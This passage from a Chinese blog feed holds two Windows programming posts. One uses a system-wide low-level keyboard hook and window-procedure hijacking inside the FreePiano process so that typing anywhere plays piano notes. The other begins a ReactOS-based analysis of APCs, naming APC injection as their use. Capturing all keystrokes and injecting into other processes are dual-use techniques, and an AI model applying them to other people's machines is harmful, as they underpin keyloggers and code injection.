<h2 id="3-发送按键信息给freepiano"><a href="#3-发送按键信息给freepiano" class="headerlink" title="3. 发送按键信息给freepiano"></a>3. 发送按键信息给freepiano</h2><p>首先想到的就是在钩子函数里给freepiano发送WM_KEYDOWN/WM_KEYUP消息就行了。</p>
<p>先找到freepiano的窗口，spy++上，找到窗口标题和类型信息，然后代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HWND hwnd = FindWindow(&quot;FreePianoMainWindow&quot;, &quot;Wispow Freepiano 2&quot;);</span><br><span class="line">if(hwnd == NULL)</span><br><span class="line">&#123;</span><br><span class="line">	hwnd =  FindWindow(&quot;FreePianoMainWindow&quot;, NULL);</span><br><span class="line">	if(hwnd == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		hwnd =  FindWindow(NULL, &quot;Wispow Freepiano 2&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后就是发消息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(hwnd)</span><br><span class="line">&#123;</span><br><span class="line">	SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);</span><br><span class="line">	if(keydown)</span><br><span class="line">	&#123;</span><br><span class="line">		keydown = false;</span><br><span class="line">		PostMessage(hwnd, WM_KEYDOWN, wParam, lParam);</span><br><span class="line">	&#125;else</span><br><span class="line">	&#123;</span><br><span class="line">		keydown = true;</span><br><span class="line">		PostMessage(hwnd, WM_KEYUP, wParam, lParam);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试，失败了，没有预想的效果。</p>
<p>分析原因：</p>
<ol>
<li>Post发送消息失败。但是通过spy++抓消息看到freepiano是收到了消息的。那就不是这个原因。</li>
<li>freepiano校验了窗口是否激活？然后就用上面每次置顶试了一下，依然不行。</li>
<li>freepiano使用了GetKeyState之类的函数检查按键状态，通过ida简单看了一下导入表，没有相关函数（没有深究是否显示导入了）。</li>
<li>用ida看了下freepiano的窗口消息处理，看是否有什么过滤</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v7.lpfnWndProc = (WNDPROC)xxx_main_wndproc_41D070; //窗口响应函数</span><br><span class="line">v7.cbClsExtra = 0;</span><br><span class="line">v7.cbWndExtra = 0;</span><br><span class="line">v7.hInstance = GetModuleHandleA(0);</span><br><span class="line">v7.hIcon = LoadIconA(v1, (LPCSTR)0xA);</span><br><span class="line">v7.hCursor = 0;</span><br><span class="line">v7.hbrBackground = 0;</span><br><span class="line">v7.lpszMenuName = 0;</span><br><span class="line">v7.lpszClassName = &quot;FreePianoMainWindow&quot;;</span><br></pre></td></tr></table></figure>
<p>然后发现居然没有对WM_KEYDOWN/WM_KEYUP/WM_CHAR之类的消息进行处理，那是怎么接受的按键信息</p>
<p>继续用ida看是否有钩子之类的处理，果然，导入表中明晃晃的SetWindowsHookEx，进入一看，一个WM_KEYBOARD_LL局部钩子</p>
<p><img src="/img/freepiano_4.png" alt="img"></p>
<p>进钩子函数一下，各种按键状态记录的处理，不深究了。基本确认他使用这种方式来接受按键信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v6 = (unsigned __int8)byte_4F6DC8[scanCode];</span><br><span class="line"> if ( (unsigned int)(v6 - 1) &gt; 0x6A )</span><br><span class="line">   goto LABEL_23;</span><br><span class="line"> if ( (unsigned __int8)byte_4F6ED0[v6] != pressed_0 )</span><br><span class="line"> &#123;</span><br><span class="line">   byte_4F6ED0[v6] = pressed_0;</span><br><span class="line">   sub_449B20(v6, pressed_0 != 0);</span><br><span class="line"> &#125;</span><br><span class="line"> if ( (_BYTE)dword_4F6DC0</span><br><span class="line">   || BYTE1(dword_4F6DC0) &amp;&amp; (v6 == &apos;D&apos; || v6 == &apos;H&apos;)</span><br><span class="line">   || BYTE2(dword_4F6DC0) &amp;&amp; (byte_4F6F15 || byte_4F6F17) &amp;&amp; v6 == 28 )</span><br><span class="line">   result = 1;</span><br><span class="line"> else</span><br></pre></td></tr></table></figure>
<h2 id="4-改变策略"><a href="#4-改变策略" class="headerlink" title="4. 改变策略"></a>4. 改变策略</h2><p>那就不能直接PostMessage发送消息了。</p>
<p>修改我的钩子为WM_KEYBOARD_LL全局键盘钩子，消息和freepiano完全一样了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g_Hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hMod, 0);</span><br></pre></td></tr></table></figure>
<p>钩子函数通过WM_COPYDATA打包数据，发送给freepiano</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK LowLevelKeyboardProc(  int nCode,     // hook code</span><br><span class="line">									  WPARAM wParam, // message identifier  </span><br><span class="line">									  LPARAM lParam  // message data</span><br><span class="line">									  )</span><br><span class="line">&#123;</span><br><span class="line">	COPYDATASTRUCT CopyData = &#123;0&#125;;</span><br><span class="line">	KeyboardLL_Msg Msg = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">	Msg.nCode = nCode;</span><br><span class="line">	Msg.wParam = wParam;</span><br><span class="line">	memcpy(&amp;Msg.lParam, (char*)lParam, sizeof(KBDLLHOOKSTRUCT));</span><br><span class="line"></span><br><span class="line">	CopyData.cbData = sizeof(KeyboardLL_Msg);</span><br><span class="line">	CopyData.dwData = 0;</span><br><span class="line">	CopyData.lpData = &amp;Msg;</span><br><span class="line"></span><br><span class="line">	HWND hwnd = FindFreepiano();</span><br><span class="line">	if(hwnd)</span><br><span class="line">	&#123;</span><br><span class="line">		BOOL ret = SendMessage(hwnd, WM_COPYDATA, (WPARAM)hwnd, (LPARAM)&amp;CopyData);</span><br><span class="line">	&#125;</span><br><span class="line">	return CallNextHookEx(g_Hook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line">typedef struct _KeyboardLL_Msg</span><br><span class="line">&#123;</span><br><span class="line">	int nCode;</span><br><span class="line">	WPARAM wParam;</span><br><span class="line">	KBDLLHOOKSTRUCT lParam;</span><br><span class="line">&#125;KeyboardLL_Msg, *PKeyboardLL_Msg;</span><br></pre></td></tr></table></figure>
<p>通过SetWindowLong挂钩freepiano的窗口响应函数，增加处理WM_COPYDATA，来接受全局键盘信息，找到freepiano的钩子函数地址A，然后接受到WM_COPYDATA之后，直接调用A，把键盘信息给freepiano</p>
<p>通过一个线程，循环查找freepianp窗口（可能还没起来），然后hook窗口响应函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void HookWinProc()</span><br><span class="line">&#123;</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">		HWND hwnd = FindFreepiano();</span><br><span class="line">		if(hwnd)</span><br><span class="line">		&#123;</span><br><span class="line">			g_WndProc = (pfn_WindProc)GetWindowLong(hwnd, GWL_WNDPROC);</span><br><span class="line">			if(g_WndProc)</span><br><span class="line">			&#123;</span><br><span class="line">				SetWindowLong(hwnd, GWL_WNDPROC, (LONG)fakeWindowProc);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Sleep(10);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>自己的函数中加入对WM_COPYDATA的消息处理，调用freepiano的钩子函数g_LowLevelKeyboardProc发键盘消息过去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">LRESULT WINAPI fakeWindowProc(</span><br><span class="line">					   HWND hWnd,              // handle to window</span><br><span class="line">					   UINT Msg,               // message</span><br><span class="line">					   WPARAM wParam,          // first message parameter</span><br><span class="line">					   LPARAM lParam           // second message parameter</span><br><span class="line">					   )</span><br><span class="line">&#123;</span><br><span class="line">	if(Msg == WM_COPYDATA)</span><br><span class="line">	&#123;</span><br><span class="line">		COPYDATASTRUCT* CopyData = (COPYDATASTRUCT*)lParam;	</span><br><span class="line">		//if(CopyData-&gt;cbData == sizeof(KeyboardLL_Msg))</span><br><span class="line">		&#123;</span><br><span class="line">			KeyboardLL_Msg* Msg = (KeyboardLL_Msg*)CopyData-&gt;lpData;</span><br><span class="line">			g_LowLevelKeyboardProc(Msg-&gt;nCode, Msg-&gt;wParam, (LPARAM)&amp;Msg-&gt;lParam);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return g_WndProc(hWnd, Msg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>g_LowLevelKeyboardProc地址这里使用硬编码，图方便<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hExe = GetModuleHandle(NULL);</span><br><span class="line">g_LowLevelKeyboardProc = (pfn_LowLevelKeyboardProc)((DWORD)hExe + (DWORD)g_LowLevelKeyboardProc);</span><br></pre></td></tr></table></figure></p>
<p>功能到这里基本搞定。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>测试通过。</p>
<p>手指立马不受控制的在编辑器里、浏览器、文件浏览器里各种按键，然后耳边响起了悠扬（忽略乱打的节奏的话）的钢琴声~~</p>
<p>可能的优化：</p>
<ol>
<li>加入进程名单控制，不想在某些进程中听到琴声</li>
<li>代码优化~~</li>
</ol>
<p>有兴趣的同学可以去折腾，我这里就不继续了~~</p>
<p>转载请注明出处：<a href="http://anhkgg.github.io/coding-piano-hook">http://anhkgg.github.io/coding-piano-hook</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;突然想玩一下键盘弹曲子，就找到了&lt;a href=&quot;http://freepiano.tiwb.com/cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;freepiano&lt;/a&gt;，专业的东西不懂，就找了写简谱来玩玩，感觉挺不错的，哈哈~~&lt;/p&gt;
&lt;p&gt;玩疯了之后，突然想到，我平时写代码，是不是可以弹出一段曲子呢，是不是心情会变得非常好，代码也写的更有节奏呢~~&lt;/p&gt;
&lt;p&gt;说不定还搞出来一个什么《代码之歌》的钢琴曲~~ 嘎嘎&lt;/p&gt;
&lt;p&gt;突然被自己这个想法吸引住了，不管咋样，每敲下代码的一个字符，后面想起了背景音乐，真是不错的，程序员也可以是“钢琴师”啊~~&lt;/p&gt;
&lt;p&gt;有了想法，就开整！！！&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
    
    
      <category term="WM_KEYBOARD_LL" scheme="https://anhkgg.github.io/tags/WM-KEYBOARD-LL/"/>
    
      <category term="HOOK" scheme="https://anhkgg.github.io/tags/HOOK/"/>
    
      <category term="freepiano" scheme="https://anhkgg.github.io/tags/freepiano/"/>
    
      <category term="inject" scheme="https://anhkgg.github.io/tags/inject/"/>
    
  </entry>
  
  <entry>
    <title>小Win，点一份APC（Apc机制详解）（一）</title>
    <link href="https://anhkgg.github.io/win-apc-analyze1/"/>
    <id>https://anhkgg.github.io/win-apc-analyze1/</id>
    <published>2017-04-28T10:20:47.000Z</published>
    <updated>2017-04-28T14:11:51.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="翻开"><a href="#翻开" class="headerlink" title="翻开"></a>翻开</h1><p>翻开小Win的菜单，APC赫然在目…</p>
<p>做工讲究，味道不错，是小Win的热门菜，我们点一来尝尝！</p>
<p>吃了可以做很多事情…</p>
<ul>
<li>APC注入</li>
<li>APC注入</li>
<li>APC注入</li>
<li>…</li>
</ul>
<a id="more"></a>
<blockquote>
<p>细节来自于<code>ReactOS</code>源码分析。</p>
<p>如果对这个发神经的文风有任何不适，请谅解，因为我确实神经了</p>
</blockquote>
<h1 id="来一份APC"><a href="#来一份APC" class="headerlink" title="来一份APC"></a>来一份APC</h1><h2 id="ring3这么做的"><a href="#ring3这么做的" class="headerlink" title="ring3这么做的"></a>ring3这么做的</h2><p>点APC的正确姿势是使用<code>QueueUserApc</code>，不走寻常路的也可以使用<code>NtQueueApcThread</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI QueueUserApc(PARCFUNC pfnApc, HANDLE hThread, ULONG_PTR dwData);</span><br><span class="line">&#123;</span><br><span class="line">    NtQueueApcThread(hThread, IntCallUserApc, pfnApc, dwData, NULL);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS NTAPI NtQueueApcThread(IN HANDLE ThreadHandle, </span><br><span class="line">                                IN PKNORMAL_ROUTINUE ApcRoutine,</span><br><span class="line">                                IN PVOID NormalContext, //pfnApc</span><br><span class="line">                                IN PVOID SystemArgument1, //dwData</span><br><span class="line">                                IN PVOID SystemArgument2</span><br><span class="line">                                );</span><br></pre></td></tr></table></figure>
<p>也就是QueueUserApc内部是NtQueueApcThread做的，两者区别不大，当然，使用后者可以字节加点调料（不使用IntCallUserApc、换成自己的函数，函数参数也可以有三个了，而PARCFUNC只有一个参数）。</p>
<p>小Win默认是通过统一的接口IntCallUserApc来调用的顾客指定的Apc函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static void CALLBACK </span><br><span class="line">IntCallUserApc(PVOID Function, PVOID dwData, PVOID Arg3)</span><br><span class="line">&#123;</span><br><span class="line">    ((PAPCFUNC)Function)(dwData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ring0这么做的"><a href="#ring0这么做的" class="headerlink" title="ring0这么做的"></a>ring0这么做的</h2><p>NtQueueApcThread经过系统调用进入到ring0，一般人是看不到了…，我也是一般人来着，下面努力变成二班的…。</p>
<h3 id="1-创建APC对象"><a href="#1-创建APC对象" class="headerlink" title="1. 创建APC对象"></a>1. 创建APC对象</h3><p>进了NtQueueApcThread，先通过KeInitializeApc初始化一个Apc对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* Initialize the APC */</span><br><span class="line">KeInitializeApc(Apc,</span><br><span class="line">                &amp;Thread-&gt;Tcb, //KTHREAD</span><br><span class="line">                OriginalApcEnvironment,</span><br><span class="line">                PspQueueApcSpecialApc,</span><br><span class="line">                NULL,</span><br><span class="line">                ApcRoutine,</span><br><span class="line">                UserMode,</span><br><span class="line">                NormalContext);</span><br></pre></td></tr></table></figure></p>
<p>APC对象结构定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KAPC &#123;</span><br><span class="line">  UCHAR Type; //类型ApcObject</span><br><span class="line">  UCHAR SpareByte0;</span><br><span class="line">  UCHAR Size; //APC结构体大小</span><br><span class="line">  UCHAR SpareByte1;</span><br><span class="line">  ULONG SpareLong0;</span><br><span class="line">  struct _KTHREAD *Thread; //当前线程的KTHREAD</span><br><span class="line">  LIST_ENTRY ApcListEntry; //当前线程的APC链表</span><br><span class="line">  PKKERNEL_ROUTINE KernelRoutine; //</span><br><span class="line">  PKRUNDOWN_ROUTINE RundownRoutine; //</span><br><span class="line">  PKNORMAL_ROUTINE NormalRoutine; //</span><br><span class="line">  PVOID NormalContext; //用户定义的Apc函数</span><br><span class="line">  PVOID SystemArgument1; //用户Apc函数的参数</span><br><span class="line">  PVOID SystemArgument2;//</span><br><span class="line">  CCHAR ApcStateIndex; //Apc状态</span><br><span class="line">  KPROCESSOR_MODE ApcMode; //Apc所处的Mode，UserMode/KernelMode</span><br><span class="line">  BOOLEAN Inserted;     //是否已经被插入队列</span><br><span class="line">&#125; KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC;</span><br></pre></td></tr></table></figure></p>
<p>根据KeInitializeApc传入参数，Apc被赋值如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Apc-&gt;KernelRoutine = PspQueueApcSpecialApc;</span><br><span class="line">Apc-&gt;RundownRoutine = NULL;</span><br><span class="line">Apc-&gt;NormalRoutine = ApcRoutine;//如果使用QueueUserApc，其实就是IntCallUserApc</span><br><span class="line">Apc-&gt;NormalContext = NormalContext;//pfnApc;//用户指定的Apc函数</span><br><span class="line">Apc-&gt;Type = ApcObject;</span><br><span class="line"></span><br><span class="line">//如果参数指定的是CurrentApcEnvironment，直接赋值Thread-&gt;ApcStateIndex</span><br><span class="line">Apc-&gt;ApcStateIndex = Thread-&gt;ApcStateIndex;</span><br><span class="line">//不是则</span><br><span class="line">Apc-&gt;ApcStateIndex = OriginalApcEnvironment;//</span><br><span class="line"></span><br><span class="line">//如果参数ApcRoutine不是NULL</span><br><span class="line">Apc-&gt;ApcMode = Mode;</span><br><span class="line">Apc-&gt;NormalContext = Context;</span><br><span class="line">//是NULL</span><br><span class="line">Apc-&gt;ApcMode = KernelMode;</span><br><span class="line">Apc-&gt;NormalContext = NULL;</span><br><span class="line"></span><br><span class="line">Apc-&gt;Inserted = False;</span><br></pre></td></tr></table></figure>
<p>其中关于ApcStateIndex有4中值，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// APC Environment Types</span><br><span class="line">//</span><br><span class="line">typedef enum _KAPC_ENVIRONMENT</span><br><span class="line">&#123;</span><br><span class="line">    OriginalApcEnvironment,//0</span><br><span class="line">    AttachedApcEnvironment,//1</span><br><span class="line">    CurrentApcEnvironment,//2</span><br><span class="line">    InsertApcEnvironment</span><br><span class="line">&#125; KAPC_ENVIRONMENT;</span><br></pre></td></tr></table></figure></p>
<p>Apc-&gt;KernelRoutine总是有值的，被赋值为PspQueueApcSpecialApc，用于Apc结束时候释放Apc对象内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line">NTAPI</span><br><span class="line">PspQueueApcSpecialApc(IN PKAPC Apc,</span><br><span class="line">                      IN OUT PKNORMAL_ROUTINE* NormalRoutine,</span><br><span class="line">                      IN OUT PVOID* NormalContext,</span><br><span class="line">                      IN OUT PVOID* SystemArgument1,</span><br><span class="line">                      IN OUT PVOID* SystemArgument2)</span><br><span class="line">&#123;</span><br><span class="line">    /* Free the APC and do nothing else */</span><br><span class="line">    ExFreePool(Apc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-插入APC队列"><a href="#2-插入APC队列" class="headerlink" title="2. 插入APC队列"></a>2. 插入APC队列</h3><p>通过<code>KeInsertQueueApc</code>插入队列，在队列中等待被上菜…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KeInsertQueueApc(Apc,</span><br><span class="line">                          SystemArgument1,</span><br><span class="line">                          SystemArgument2,</span><br><span class="line">                          IO_NO_INCREMENT))</span><br></pre></td></tr></table></figure>
<ol>
<li>确认Apc未被插入，Thread-&gt;ApcQueueable为真</li>
<li>Apc-&gt;Inserted = True</li>
<li>然后通过<code>KiInsertQueueApc</code>插入队列，可能通过软中断或者唤醒线程得到执行Apc的机会</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line">FASTCALL</span><br><span class="line">KiInsertQueueApc(IN PKAPC Apc,</span><br><span class="line">                 IN KPRIORITY PriorityBoost)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    if (Apc-&gt;ApcStateIndex == InsertApcEnvironment)</span><br><span class="line">    &#123;</span><br><span class="line">        Apc-&gt;ApcStateIndex = Thread-&gt;ApcStateIndex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //PKAPC_STATE ApcStatePointer[2];//说明ApcStateIndex只能是</span><br><span class="line">    //OriginalApcEnvironment,//0</span><br><span class="line">    //AttachedApcEnvironment,//1</span><br><span class="line">    //从Thread的ApcStatePointer取出对应的ApcState</span><br><span class="line">    ApcState = Thread-&gt;ApcStatePointer[(UCHAR)Apc-&gt;ApcStateIndex];</span><br><span class="line">    ApcMode = Apc-&gt;ApcMode;</span><br><span class="line">    </span><br><span class="line">    ASSERT(Apc-&gt;Inserted == TRUE);</span><br><span class="line">    </span><br><span class="line">    /* 插入队列的三种方式:</span><br><span class="line">     * 1) Kernel APC with Normal Routine or User APC = Put it at the end of the List</span><br><span class="line">     * 2) User APC which is PsExitSpecialApc = Put it at the front of the List</span><br><span class="line">     * 3) Kernel APC without Normal Routine = Put it at the end of the No-Normal Routine Kernel APC list</span><br><span class="line">     */</span><br><span class="line">    //PsExitSpecialApc</span><br><span class="line">    </span><br><span class="line">    if (Thread-&gt;ApcStateIndex == Apc-&gt;ApcStateIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        if(当前线程 ) &#123;</span><br><span class="line">            if(KernelMode) &#123;</span><br><span class="line">                Thread-&gt;ApcState.KernelApcPending = TRUE;</span><br><span class="line">                if (!Thread-&gt;SpecialApcDisable)</span><br><span class="line">                    &#123;</span><br><span class="line">                        //中断线程当前执行六？？</span><br><span class="line">                        /* They&apos;re not, so request the interrupt */</span><br><span class="line">                        HalRequestSoftwareInterrupt(APC_LEVEL);</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            if(KernelMode) &#123;</span><br><span class="line">                Thread-&gt;ApcState.KernelApcPending = TRUE;</span><br><span class="line">                if (Thread-&gt;State == Running) HalRequestSoftwareInterrupt(APC_LEVEL);</span><br><span class="line">                else if(一堆条件)&#123;</span><br><span class="line">                    KiUnwaitThread(Thread, Status, PriorityBoost);//唤醒线程</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if ((Thread-&gt;State == Waiting) &amp;&amp;</span><br><span class="line">                     (Thread-&gt;WaitMode == UserMode) &amp;&amp;</span><br><span class="line">                     ((Thread-&gt;Alertable) || //</span><br><span class="line">                      (Thread-&gt;ApcState.UserApcPending)))</span><br><span class="line">                &#123;</span><br><span class="line">                    /* Set user-mode APC pending */</span><br><span class="line">                    Thread-&gt;ApcState.UserApcPending = TRUE;</span><br><span class="line">                    Status = STATUS_USER_APC;</span><br><span class="line">                    KiUnwaitThread(Thread, Status, PriorityBoost);//唤醒线程</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先不管Apc是怎么得到执行的，来看看KAPC_STATE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KAPC_STATE</span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY ApcListHead[2];//UserMode/KernelMode的两个链表</span><br><span class="line">    struct _KPROCESS *Process;</span><br><span class="line">    BOOLEAN KernelApcInProgress;</span><br><span class="line">    BOOLEAN KernelApcPending; //等待执行</span><br><span class="line">    BOOLEAN UserApcPending; //等待执行</span><br><span class="line">&#125; KAPC_STATE, *PKAPC_STATE, *RESTRICTED_POINTER PRKAPC_STATE;</span><br></pre></td></tr></table></figure>
<p>其中ApcListHead保存了线程的两个Apc链表，分别对应UserMode和KernelMode。</p>
<p>Thread-&gt;ApcState表示当前需要执行的ApcState，可能是挂靠进程的</p>
<p>Thread-&gt;SavedApcState表示挂靠后保存的当前线程的ApcState，</p>
